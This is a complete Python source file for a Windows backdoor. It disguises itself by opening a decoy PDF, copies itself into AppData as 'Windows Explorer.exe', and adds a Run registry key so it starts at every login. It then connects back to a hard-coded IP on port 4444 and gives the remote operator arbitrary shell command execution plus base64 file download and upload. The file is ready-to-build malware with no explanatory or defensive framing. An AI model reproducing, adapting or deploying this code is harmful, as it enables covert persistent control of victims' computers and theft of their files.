import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            received_data = self.reliable_recv()

            try:
                if received_data[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif received_data[0] == "cd" and len(received_data) > 1:
                    cmd_result = self.change_directory(received_data[1])
                elif received_data[0] == "download":
                    cmd_result = self.read_file(received_data[1]).decode()
                elif received_data[0] == "upload":
                    cmd_result = self.write_file(received_data[1], received_data[2])
                else:
                    cmd_result = self.execute_system_command(received_data).decode()

            except Exception:
                cmd_result = "[-] Error during command execution."

            self.reliable_send(cmd_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.1.165", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()